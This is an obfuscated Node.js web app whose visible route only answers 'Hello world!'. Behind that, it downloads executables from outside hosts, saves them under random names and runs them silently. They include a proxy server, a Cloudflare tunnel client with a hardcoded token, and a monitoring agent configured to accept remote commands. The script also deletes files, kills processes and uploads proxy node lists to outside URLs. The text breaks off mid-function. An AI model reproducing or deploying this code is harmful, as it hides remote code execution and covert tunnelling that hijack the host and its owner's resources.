const _0x2f95b2=_0x26f4;function _0x38b2(){const _0x3689ea=['\x0a\x20\x20credentials-file:\x20','\x22\x20>\x20/dev/null\x202>&1','SERVER_PORT','Empowerment\x20failed\x20for\x20','none','stringify','Download\x20','block','./tmp','195790ziszxd','\x0a\x0atrojan://','Subscription\x20uploaded\x20successfully','firefox','2053','mkdirSync','all','Error\x20reading\x20boot.log:','stream','length','\x20-s\x20','\x20is\x20running','pkill\x20-f\x20\x22[','fileUrl','NAME','xtls-rprx-vision','ARGO_DOMAIN:','forEach','/trojan-argo','toString','config.yaml','\x0a\x0avmess://','readFileSync','data','CFPORT','2096','catch','amd','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','1xPpJIY','CFIP','UPLOAD_URL','rm\x20-rf\x20','tls','npm\x20running\x20error:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','blackhole','Hello\x20world!','writeFileSync','App\x20is\x20running','https://amd64.ssss.nyc.mn/bot','sub.txt','false','win32','er.cfg.cc.cd','text/plain;\x20charset=utf-8','Error\x20downloading\x20files:','status','FILE_PATH','Content-Type','1337592ewMBPz','abcdefghijklmnopqrstuvwxyz','join','util','trojan','1284izYnHS','automatic\x20access\x20task\x20added\x20successfully','?encryption=none&security=tls&sni=','arm','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','?security=tls&sni=','split','fileName','2087','chmod','--tls','tunnel.yml','https://amd64.ssss.nyc.mn/agent','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','charAt','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','127.0.0.1','Skipping\x20adding\x20automatic\x20access\x20task','2083','floor','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/api/add-nodes','&fp=firefox&type=ws&host=','log','aarch64','https://arm64.ssss.nyc.mn/bot','response','443','ARGO_DOMAIN','createWriteStream','733906rkdGLA','.exe\x20>\x20nul\x202>&1','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','pop','8443','964041VbIGZI','base64','close','basename','test','nohup\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','get','\x0avless://','NEZHA_PORT','208ECczdS','pipe','clear','error','exec','261702gtZDAA','env','7070RGxeuh','success','push','set','isFile','express','15411SKzMBe','7AwiJEQ','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0a\x20\x20\x20\x20','send','arch','/api/delete-nodes','random','php\x20running\x20error:\x20','arm64','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','tunnel.json','utf-8','includes','\x20is\x20created','NEZHA\x20variable\x20is\x20empty,skip\x20running','tcp','unlink','https://amd64.ssss.nyc.mn/web','taskkill\x20/f\x20/im\x20','PROJECT_URL','\x20already\x20exists','cdns.doon.eu.org','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','from','post','ArgoDomain:','TunnelSecret','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20failed:\x20','/api/add-subscriptions','substring','has','/dev/null','existsSync','child_process','https+local://8.8.8.8/dns-query','vmess','Empowerment\x20success\x20for\x20','vless','\x20>/dev/null\x202>&1\x20&','Error\x20executing\x20command:\x20','quic','unshift','https://arm64.ssss.nyc.mn/web','Nodes\x20uploaded\x20successfully','application/json','https://oooo.serv00.net/add-url','readdirSync','unlinkSync','\x20-p\x20','\x20>\x20nul\x202>&1','Error\x20in\x20startserver:','http://ip-api.com/json/','\x0a\x20\x20tunnel:\x20','https://arm64.ssss.nyc.mn/agent','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','list.txt','https://amd64.ssss.nyc.mn/v1','http\x20server\x20is\x20running\x20on\x20port:','country_code','org','9UmcZQS','\x20-c\x20','match','UUID','map','axios','message','filter','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','then','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','boot.log','platform','/config.json\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','direct','/vmess-argo','/vmess-argo?ed=2560','/tunnel.yml\x20run','ARGO_AUTH','http'];_0x38b2=function(){return _0x3689ea;};return _0x38b2();}(function(_0x3fa1ba,_0x37712a){const _0x38b661={_0x5da39e:0x11c,_0x5b07d7:0x121,_0x335cb6:0x132,_0x57a1c8:0x130,_0x15ffeb:0x1c6,_0xd19657:0x194,_0x1e74ee:0x1cb},_0x54de6a=_0x26f4,_0x2125ae=_0x3fa1ba();while(!![]){try{const _0x1e6486=parseInt(_0x54de6a(0x1b1))/0x1*(parseInt(_0x54de6a(_0x38b661._0x5da39e))/0x2)+parseInt(_0x54de6a(_0x38b661._0x5b07d7))/0x3+parseInt(_0x54de6a(0x12b))/0x4*(-parseInt(_0x54de6a(_0x38b661._0x335cb6))/0x5)+-parseInt(_0x54de6a(_0x38b661._0x57a1c8))/0x6+parseInt(_0x54de6a(0x139))/0x7*(-parseInt(_0x54de6a(_0x38b661._0x15ffeb))/0x8)+-parseInt(_0x54de6a(0x176))/0x9*(-parseInt(_0x54de6a(_0x38b661._0xd19657))/0xa)+parseInt(_0x54de6a(0x138))/0xb*(-parseInt(_0x54de6a(_0x38b661._0x1e74ee))/0xc);if(_0x1e6486===_0x37712a)break;else _0x2125ae['push'](_0x2125ae['shift']());}catch(_0x48ddcc){_0x2125ae['push'](_0x2125ae['shift']());}}}(_0x38b2,0x42cdc));const express=require(_0x2f95b2(0x137)),app=express(),axios=require(_0x2f95b2(0x17b)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x2f95b2(0x1c9)),exec=promisify(require('child_process')[_0x2f95b2(0x12f)]),{execSync}=require(_0x2f95b2(0x15b)),UPLOAD_URL=process[_0x2f95b2(0x131)][_0x2f95b2(0x1b3)]||'',PROJECT_URL=process['env'][_0x2f95b2(0x14c)]||'',AUTO_ACCESS=process[_0x2f95b2(0x131)]['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x2f95b2(0x1c4)]||_0x2f95b2(0x193),SUB_PATH=process[_0x2f95b2(0x131)]['SUB_PATH']||'er',PORT=process[_0x2f95b2(0x131)][_0x2f95b2(0x18d)]||process['env']['PORT']||0xbb8,UUID=process[_0x2f95b2(0x131)][_0x2f95b2(0x179)]||'a9a73e08-f194-4c4a-910a-e9d3bacecd06',NEZHA_SERVER=process[_0x2f95b2(0x131)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x2f95b2(0x131)][_0x2f95b2(0x12a)]||'',NEZHA_KEY=process[_0x2f95b2(0x131)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x2f95b2(0x131)][_0x2f95b2(0x11a)]||_0x2f95b2(0x1c0),ARGO_AUTH=process['env'][_0x2f95b2(0x189)]||'eyJhIjoiZmI4MjkzOGMwNWJjNDdhNzBmNDg2OWU5NDc5MjRiNGUiLCJ0IjoiODRjM2RiM2ItYTdlYy00YWJjLTk4NjctMTg3YzhkY2IyMGUzIiwicyI6Ill6VXlPVFk0TmprdFpURXdOQzAwWldZeExUZzJOekl0WXpBd09ETmlaakV5TXpobCJ9',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x2f95b2(0x131)][_0x2f95b2(0x1b2)]||_0x2f95b2(0x14e),CFPORT=process[_0x2f95b2(0x131)][_0x2f95b2(0x1ac)]||0x1bb,NAME=process[_0x2f95b2(0x131)][_0x2f95b2(0x1a2)]||'tuot-er';!fs['existsSync'](FILE_PATH)?(fs[_0x2f95b2(0x199)](FILE_PATH),console[_0x2f95b2(0x1e2)](FILE_PATH+_0x2f95b2(0x146))):console['log'](FILE_PATH+_0x2f95b2(0x14d));function generateRandomName(){const _0x8402e0={_0x4c87ab:0x1c7,_0xaf3661:0x1de},_0x46c581=_0x2f95b2,_0x488c20=_0x46c581(_0x8402e0._0x4c87ab);let _0x14d738='';for(let _0x557e3d=0x0;_0x557e3d<0x6;_0x557e3d++){_0x14d738+=_0x488c20[_0x46c581(0x1d9)](Math[_0x46c581(_0x8402e0._0xaf3661)](Math[_0x46c581(0x13f)]()*_0x488c20['length']));}return _0x14d738;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2f95b2(0x1c8)](FILE_PATH,npmName),phpPath=path[_0x2f95b2(0x1c8)](FILE_PATH,phpName),webPath=path[_0x2f95b2(0x1c8)](FILE_PATH,webName),botPath=path[_0x2f95b2(0x1c8)](FILE_PATH,botName),subPath=path[_0x2f95b2(0x1c8)](FILE_PATH,_0x2f95b2(0x1bd)),listPath=path[_0x2f95b2(0x1c8)](FILE_PATH,_0x2f95b2(0x171)),bootLogPath=path[_0x2f95b2(0x1c8)](FILE_PATH,_0x2f95b2(0x181)),configPath=path[_0x2f95b2(0x1c8)](FILE_PATH,'config.json');function deleteNodes(){const _0x2fb027={_0x457710:0x1aa,_0x3af3dc:0x122,_0x386ff3:0x144,_0x4bdf71:0x17d,_0x365fd1:0x151,_0x494df7:0x13e},_0x5d5036=_0x2f95b2;try{if(!UPLOAD_URL)return;if(!fs[_0x5d5036(0x15a)](subPath))return;let _0x739c5d;try{_0x739c5d=fs[_0x5d5036(_0x2fb027._0x457710)](subPath,_0x5d5036(0x144));}catch{return null;}const _0x44064c=Buffer[_0x5d5036(0x150)](_0x739c5d,_0x5d5036(_0x2fb027._0x3af3dc))['toString'](_0x5d5036(_0x2fb027._0x386ff3)),_0x52054f=_0x44064c['split']('\x0a')[_0x5d5036(_0x2fb027._0x4bdf71)](_0x7702a3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5d5036(0x125)](_0x7702a3));if(_0x52054f[_0x5d5036(0x19d)]===0x0)return;return axios[_0x5d5036(_0x2fb027._0x365fd1)](UPLOAD_URL+_0x5d5036(_0x2fb027._0x494df7),JSON[_0x5d5036(0x190)]({'nodes':_0x52054f}),{'headers':{'Content-Type':_0x5d5036(0x166)}})['catch'](_0xa123d3=>{return null;}),null;}catch(_0x4006e5){return null;}}function cleanupOldFiles(){const _0x4d3a0a={_0x5aaa9:0x168},_0x2cfc08={_0x173605:0x136},_0x3390d3=_0x2f95b2;try{const _0xaeba8b=fs[_0x3390d3(_0x4d3a0a._0x5aaa9)](FILE_PATH);_0xaeba8b[_0x3390d3(0x1a5)](_0x306562=>{const _0x551642=_0x3390d3,_0x5a22c4=path['join'](FILE_PATH,_0x306562);try{const _0x12cba1=fs['statSync'](_0x5a22c4);_0x12cba1[_0x551642(_0x2cfc08._0x173605)]()&&fs[_0x551642(0x169)](_0x5a22c4);}catch(_0x15c215){}});}catch(_0x595084){}}app['get']('/',function(_0x2c460d,_0x36b0d4){const _0x40af56={_0x27548e:0x13c},_0x6c2060=_0x2f95b2;_0x36b0d4[_0x6c2060(_0x40af56._0x27548e)](_0x6c2060(0x1b9));});async function generateConfig(){const _0x51cf7c={_0x3cab91:0x15f,_0x4917de:0x18f,_0x4626fa:0x15f,_0x44235d:0x18f,_0x1c19f6:0x18a,_0x450fd4:0x1b5,_0x19acbe:0x1db,_0x22c47e:0x15d,_0x5bf891:0x186,_0x439f0e:0x162,_0x543dbb:0x1ca,_0x3716a3:0x18f},_0x85e9ea=_0x2f95b2,_0x3e7c3f={'log':{'access':'/dev/null','error':_0x85e9ea(0x159),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x85e9ea(_0x51cf7c._0x3cab91),'settings':{'clients':[{'id':UUID,'flow':_0x85e9ea(0x1a3)}],'decryption':_0x85e9ea(_0x51cf7c._0x4917de),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x85e9ea(0x1a6),'dest':0xbbc}]},'streamSettings':{'network':_0x85e9ea(0x148)}},{'port':0xbb9,'listen':_0x85e9ea(0x1db),'protocol':_0x85e9ea(0x15f),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x85e9ea(0x18f)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x85e9ea(_0x51cf7c._0x4626fa),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x85e9ea(_0x51cf7c._0x4917de)},'streamSettings':{'network':'ws','security':_0x85e9ea(_0x51cf7c._0x44235d),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x85e9ea(_0x51cf7c._0x1c19f6),_0x85e9ea(_0x51cf7c._0x450fd4),_0x85e9ea(0x162)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x85e9ea(_0x51cf7c._0x19acbe),'protocol':_0x85e9ea(_0x51cf7c._0x22c47e),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x85e9ea(_0x51cf7c._0x5bf891)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x85e9ea(0x1b5),_0x85e9ea(_0x51cf7c._0x439f0e)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x85e9ea(_0x51cf7c._0x543dbb),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x85e9ea(_0x51cf7c._0x3716a3),'wsSettings':{'path':_0x85e9ea(0x1a6)}},'sniffing':{'enabled':!![],'destOverride':[_0x85e9ea(0x18a),_0x85e9ea(_0x51cf7c._0x450fd4),_0x85e9ea(0x162)],'metadataOnly':![]}}],'dns':{'servers':[_0x85e9ea(0x15c)]},'outbounds':[{'protocol':'freedom','tag':_0x85e9ea(0x185)},{'protocol':_0x85e9ea(0x1b8),'tag':_0x85e9ea(0x192)}]};fs[_0x85e9ea(0x1ba)](path[_0x85e9ea(0x1c8)](FILE_PATH,'config.json'),JSON[_0x85e9ea(0x190)](_0x3e7c3f,null,0x2));}function getSystemArchitecture(){const _0x2313c4={_0x38cfc8:0x1ce},_0x140b7f=_0x2f95b2,_0x35cc65=os[_0x140b7f(0x13d)]();return _0x35cc65===_0x140b7f(_0x2313c4._0x38cfc8)||_0x35cc65===_0x140b7f(0x141)||_0x35cc65===_0x140b7f(0x1e3)?_0x140b7f(_0x2313c4._0x38cfc8):_0x140b7f(0x1af);}function downloadFile(_0x2f6184,_0x1fb591,_0x3fe113){const _0x177699={_0x437043:0x199,_0x475536:0x128,_0x5646ca:0x17f,_0x9bfef3:0x1ae},_0x525488={_0x41628a:0x12e},_0x51ddc3={_0x14372b:0x155,_0xefcfd8:0x17c},_0x2da593={_0x1905f9:0x1e2},_0x40aff7=_0x2f95b2,_0x1ba418=_0x2f6184;!fs['existsSync'](FILE_PATH)&&fs[_0x40aff7(_0x177699._0x437043)](FILE_PATH,{'recursive':!![]});const _0x2cf167=fs[_0x40aff7(0x11b)](_0x1ba418);axios({'method':_0x40aff7(_0x177699._0x475536),'url':_0x1fb591,'responseType':_0x40aff7(0x19c)})[_0x40aff7(_0x177699._0x5646ca)](_0x55be5e=>{const _0x571c8b=_0x40aff7;_0x55be5e[_0x571c8b(0x1ab)][_0x571c8b(0x12c)](_0x2cf167),_0x2cf167['on']('finish',()=>{const _0x10bfe7=_0x571c8b;_0x2cf167[_0x10bfe7(0x123)](),console[_0x10bfe7(_0x2da593._0x1905f9)](_0x10bfe7(0x191)+path['basename'](_0x1ba418)+'\x20successfully'),_0x3fe113(null,_0x1ba418);}),_0x2cf167['on']('error',_0x321bf5=>{const _0xcfa693=_0x571c8b;fs[_0xcfa693(0x149)](_0x1ba418,()=>{});const _0x1d96ac=_0xcfa693(0x191)+path[_0xcfa693(0x124)](_0x1ba418)+_0xcfa693(_0x51ddc3._0x14372b)+_0x321bf5[_0xcfa693(_0x51ddc3._0xefcfd8)];console[_0xcfa693(0x12e)](_0x1d96ac),_0x3fe113(_0x1d96ac);});})[_0x40aff7(_0x177699._0x9bfef3)](_0x2276e1=>{const _0xb701e=_0x40aff7,_0xf27bb='Download\x20'+path[_0xb701e(0x124)](_0x1ba418)+'\x20failed:\x20'+_0x2276e1['message'];console[_0xb701e(_0x525488._0x41628a)](_0xf27bb),_0x3fe113(_0xf27bb);});}async function downloadFilesAndRun(){const _0x520dc8={_0x330304:0x17a,_0x49caf7:0x12e,_0x3b1810:0x1d1,_0xdc862c:0x11f,_0x20d23f:0x120,_0x2ee59a:0x1ad,_0x494e9b:0x1d3,_0x2fb80f:0x1dd,_0x56e3d9:0x158,_0x5c42ce:0x14f,_0x1155cc:0x1c8,_0x3d123:0x1a8,_0x33e6a2:0x1e2,_0x93e3a5:0x1d3,_0x170842:0x145,_0x5c1df9:0x1d5,_0x40bad3:0x19e,_0x2be96a:0x16a,_0x581a03:0x1b0,_0x1473ef:0x147,_0x140ad5:0x177,_0x184858:0x178,_0x4300cd:0x1d8,_0x5d3634:0x188,_0x201a5a:0x154,_0x5a7eb5:0x126,_0x56e049:0x19f},_0x3b271b={_0x2bbbb8:0x1a5},_0x418ff6=_0x2f95b2,_0x25c482=getSystemArchitecture(),_0x3a5a64=getFilesForArchitecture(_0x25c482);if(_0x3a5a64['length']===0x0){console[_0x418ff6(0x1e2)](_0x418ff6(0x13a));return;}const _0x34397b=_0x3a5a64[_0x418ff6(_0x520dc8._0x330304)](_0x109ce8=>{const _0x3f6ece={_0x572669:0x1d2,_0x13462b:0x1a1};return new Promise((_0x9d2ae6,_0x22b486)=>{const _0x1d6590=_0x26f4;downloadFile(_0x109ce8[_0x1d6590(_0x3f6ece._0x572669)],_0x109ce8[_0x1d6590(_0x3f6ece._0x13462b)],(_0x1e5f59,_0x8b5d5)=>{_0x1e5f59?_0x22b486(_0x1e5f59):_0x9d2ae6(_0x8b5d5);});});});try{await Promise[_0x418ff6(0x19a)](_0x34397b);}catch(_0x1c3f85){console[_0x418ff6(_0x520dc8._0x49caf7)](_0x418ff6(0x1c2),_0x1c3f85);return;}function _0x5bc3bc(_0x1bb3f5){const _0x5d9ac0={_0x5da2f0:0x15a},_0x430c21=_0x418ff6,_0x37763d=0x1fd;_0x1bb3f5[_0x430c21(_0x3b271b._0x2bbbb8)](_0x4ca267=>{const _0x646cad={_0x12e934:0x18e,_0x7ee64f:0x1e2,_0x5eb105:0x15e},_0x2e0661=_0x430c21;fs[_0x2e0661(_0x5d9ac0._0x5da2f0)](_0x4ca267)&&fs[_0x2e0661(0x1d4)](_0x4ca267,_0x37763d,_0x2a7a49=>{const _0x3a8d49=_0x2e0661;_0x2a7a49?console[_0x3a8d49(0x12e)](_0x3a8d49(_0x646cad._0x12e934)+_0x4ca267+':\x20'+_0x2a7a49):console[_0x3a8d49(_0x646cad._0x7ee64f)](_0x3a8d49(_0x646cad._0x5eb105)+_0x4ca267+':\x20'+_0x37763d[_0x3a8d49(0x1a7)](0x8));});});}const _0x51db59=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5bc3bc(_0x51db59);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x458537=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x418ff6(_0x520dc8._0x3b1810)](':')[_0x418ff6(_0x520dc8._0xdc862c)]():'',_0x510cdb=new Set([_0x418ff6(0x119),_0x418ff6(_0x520dc8._0x20d23f),_0x418ff6(_0x520dc8._0x2ee59a),_0x418ff6(_0x520dc8._0x494e9b),_0x418ff6(_0x520dc8._0x2fb80f),'2053']),_0xa9a65a=_0x510cdb[_0x418ff6(_0x520dc8._0x56e3d9)](_0x458537)?'true':_0x418ff6(0x1be),_0x40742d='\x0aclient_secret:\x20'+NEZHA_KEY+_0x418ff6(_0x520dc8._0x5c42ce)+NEZHA_SERVER+_0x418ff6(0x17e)+_0xa9a65a+_0x418ff6(0x142)+UUID;fs[_0x418ff6(0x1ba)](path[_0x418ff6(_0x520dc8._0x1155cc)](FILE_PATH,_0x418ff6(_0x520dc8._0x3d123)),_0x40742d);const _0x85b4b='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x85b4b),console[_0x418ff6(_0x520dc8._0x33e6a2)](phpName+_0x418ff6(0x19f)),await new Promise(_0x198fbb=>setTimeout(_0x198fbb,0x3e8));}catch(_0x302012){console[_0x418ff6(0x12e)](_0x418ff6(0x140)+_0x302012);}}else{let _0x46c22d='';const _0x3ad1d7=[_0x418ff6(0x119),'8443',_0x418ff6(0x1ad),_0x418ff6(_0x520dc8._0x93e3a5),_0x418ff6(0x1dd),_0x418ff6(0x198)];_0x3ad1d7[_0x418ff6(_0x520dc8._0x170842)](NEZHA_PORT)&&(_0x46c22d=_0x418ff6(_0x520dc8._0x5c1df9));const _0x5c3aaf=_0x418ff6(0x126)+npmPath+_0x418ff6(_0x520dc8._0x40bad3)+NEZHA_SERVER+':'+NEZHA_PORT+_0x418ff6(_0x520dc8._0x2be96a)+NEZHA_KEY+'\x20'+_0x46c22d+_0x418ff6(_0x520dc8._0x581a03);try{await exec(_0x5c3aaf),console[_0x418ff6(_0x520dc8._0x33e6a2)](npmName+'\x20is\x20running'),await new Promise(_0x56329a=>setTimeout(_0x56329a,0x3e8));}catch(_0x58da21){console['error'](_0x418ff6(0x1b6)+_0x58da21);}}}else console[_0x418ff6(0x1e2)](_0x418ff6(_0x520dc8._0x1473ef));const _0x481362=_0x418ff6(0x126)+webPath+_0x418ff6(_0x520dc8._0x140ad5)+FILE_PATH+_0x418ff6(0x183);try{await exec(_0x481362),console[_0x418ff6(0x1e2)](webName+_0x418ff6(0x19f)),await new Promise(_0x1a5d48=>setTimeout(_0x1a5d48,0x3e8));}catch(_0x4c05c7){console[_0x418ff6(0x12e)]('web\x20running\x20error:\x20'+_0x4c05c7);}if(fs['existsSync'](botPath)){let _0x5848fc;if(ARGO_AUTH[_0x418ff6(_0x520dc8._0x184858)](/^[A-Z0-9a-z=]{120,250}$/))_0x5848fc=_0x418ff6(0x1da)+ARGO_AUTH;else ARGO_AUTH[_0x418ff6(_0x520dc8._0x184858)](/TunnelSecret/)?_0x5848fc=_0x418ff6(_0x520dc8._0x4300cd)+FILE_PATH+_0x418ff6(_0x520dc8._0x5d3634):_0x5848fc=_0x418ff6(0x1df)+FILE_PATH+_0x418ff6(_0x520dc8._0x201a5a)+ARGO_PORT;try{await exec(_0x418ff6(_0x520dc8._0x5a7eb5)+botPath+'\x20'+_0x5848fc+_0x418ff6(0x160)),console['log'](botName+_0x418ff6(_0x520dc8._0x56e049)),await new Promise(_0x1c513c=>setTimeout(_0x1c513c,0x7d0));}catch(_0x5170f0){console[_0x418ff6(0x12e)](_0x418ff6(0x161)+_0x5170f0);}}await new Promise(_0x1de617=>setTimeout(_0x1de617,0x1388));}function getFilesForArchitecture(_0x4b61e0){const _0x30a405={_0x1ba5a2:0x1ce,_0x20c023:0x164,_0x2fbb82:0x1bc,_0x27ed7b:0x16f,_0x4a973e:0x1d7,_0x359915:0x163},_0x1c9981=_0x2f95b2;let _0x460519;_0x4b61e0===_0x1c9981(_0x30a405._0x1ba5a2)?_0x460519=[{'fileName':webPath,'fileUrl':_0x1c9981(_0x30a405._0x20c023)},{'fileName':botPath,'fileUrl':_0x1c9981(0x117)}]:_0x460519=[{'fileName':webPath,'fileUrl':_0x1c9981(0x14a)},{'fileName':botPath,'fileUrl':_0x1c9981(_0x30a405._0x2fbb82)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1b1394=_0x4b61e0===_0x1c9981(0x1ce)?_0x1c9981(_0x30a405._0x27ed7b):_0x1c9981(_0x30a405._0x4a973e);_0x460519['unshift']({'fileName':npmPath,'fileUrl':_0x1b1394});}else{const _0x565fd9=_0x4b61e0==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x1c9981(0x172);_0x460519[_0x1c9981(_0x30a405._0x359915)]({'fileName':phpPath,'fileUrl':_0x565fd9});}}return _0x460519;}function argoType(){const _0x7d5edb={_0x30eeb0:0x1e2,_0xdd9b93:0x145,_0x393641:0x153,_0x5ba3de:0x143,_0x438894:0x16e,_0xd8d44f:0x170,_0x16e536:0x184},_0x1d09dd=_0x2f95b2;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1d09dd(_0x7d5edb._0x30eeb0)](_0x1d09dd(0x1cf));return;}if(ARGO_AUTH[_0x1d09dd(_0x7d5edb._0xdd9b93)](_0x1d09dd(_0x7d5edb._0x393641))){fs[_0x1d09dd(0x1ba)](path['join'](FILE_PATH,_0x1d09dd(_0x7d5edb._0x5ba3de)),ARGO_AUTH);const _0x30af2c=_0x1d09dd(_0x7d5edb._0x438894)+ARGO_AUTH['split']('\x22')[0xb]+_0x1d09dd(0x18b)+path[_0x1d09dd(0x1c8)](FILE_PATH,_0x1d09dd(0x143))+_0x1d09dd(_0x7d5edb._0xd8d44f)+ARGO_DOMAIN+_0x1d09dd(0x11e)+ARGO_PORT+_0x1d09dd(_0x7d5edb._0x16e536);fs[_0x1d09dd(0x1ba)](path[_0x1d09dd(0x1c8)](FILE_PATH,_0x1d09dd(0x1d6)),_0x30af2c);}else console[_0x1d09dd(0x1e2)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x32250a={_0x5b371c:0x19d,_0x58f367:0x152,_0x2a01e4:0x1e2,_0x4f5f40:0x180,_0x141912:0x181,_0x236133:0x126,_0x543c95:0x160,_0xc5b7a1:0x12e,_0x53d997:0x19b},_0x40b389={_0x1e188c:0x1ab,_0x37164d:0x174,_0x4b7667:0x128,_0x2409db:0x1ab,_0x34d438:0x1c3,_0x3290cf:0x133,_0x8ff64a:0x1ab,_0x20d009:0x175},_0x21685f={_0x2acbc4:0x11d,_0x57b334:0x1a0},_0x2ca00e=_0x2f95b2;let _0x34b6ac;if(ARGO_AUTH&&ARGO_DOMAIN)_0x34b6ac=ARGO_DOMAIN,console['log'](_0x2ca00e(0x1a4),_0x34b6ac),await _0x120484(_0x34b6ac);else try{const _0x15371f=fs[_0x2ca00e(0x1aa)](path[_0x2ca00e(0x1c8)](FILE_PATH,'boot.log'),_0x2ca00e(0x144)),_0xe396d=_0x15371f['split']('\x0a'),_0x4c1aad=[];_0xe396d[_0x2ca00e(0x1a5)](_0x8fc935=>{const _0x2955f0=_0x2ca00e,_0x41b3a2=_0x8fc935[_0x2955f0(0x178)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x41b3a2){const _0x16c1ce=_0x41b3a2[0x1];_0x4c1aad['push'](_0x16c1ce);}});if(_0x4c1aad[_0x2ca00e(_0x32250a._0x5b371c)]>0x0)_0x34b6ac=_0x4c1aad[0x0],console[_0x2ca00e(0x1e2)](_0x2ca00e(_0x32250a._0x58f367),_0x34b6ac),await _0x120484(_0x34b6ac);else{console[_0x2ca00e(_0x32250a._0x2a01e4)](_0x2ca00e(_0x32250a._0x4f5f40)),fs['unlinkSync'](path['join'](FILE_PATH,_0x2ca00e(_0x32250a._0x141912)));async function _0x2ba5a1(){const _0x3828be=_0x2ca00e;try{process['platform']===_0x3828be(0x1bf)?await exec(_0x3828be(0x14b)+botName+_0x3828be(_0x21685f._0x2acbc4)):await exec(_0x3828be(_0x21685f._0x57b334)+botName[_0x3828be(0x1d9)](0x0)+']'+botName[_0x3828be(0x157)](0x1)+_0x3828be(0x18c));}catch(_0x3117d7){}}_0x2ba5a1(),await new Promise(_0x13ea1a=>setTimeout(_0x13ea1a,0xbb8));const _0x2d177f=_0x2ca00e(0x1df)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2ca00e(_0x32250a._0x236133)+botPath+'\x20'+_0x2d177f+_0x2ca00e(_0x32250a._0x543c95)),console[_0x2ca00e(_0x32250a._0x2a01e4)](botName+'\x20is\x20running'),await new Promise(_0x51d99b=>setTimeout(_0x51d99b,0xbb8)),await extractDomains();}catch(_0x1c69d1){console[_0x2ca00e(_0x32250a._0xc5b7a1)]('Error\x20executing\x20command:\x20'+_0x1c69d1);}}}catch(_0x459795){console[_0x2ca00e(0x12e)](_0x2ca00e(_0x32250a._0x53d997),_0x459795);}async function _0x8f80f2(){const _0x28a9e6=_0x2ca00e;try{const _0x383cd2=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x383cd2[_0x28a9e6(_0x40b389._0x1e188c)]&&_0x383cd2[_0x28a9e6(0x1ab)][_0x28a9e6(_0x40b389._0x37164d)]&&_0x383cd2['data']['org'])return _0x383cd2[_0x28a9e6(0x1ab)]['country_code']+'_'+_0x383cd2[_0x28a9e6(_0x40b389._0x1e188c)][_0x28a9e6(0x175)];}catch(_0x11d4d3){try{const _0x32d044=await 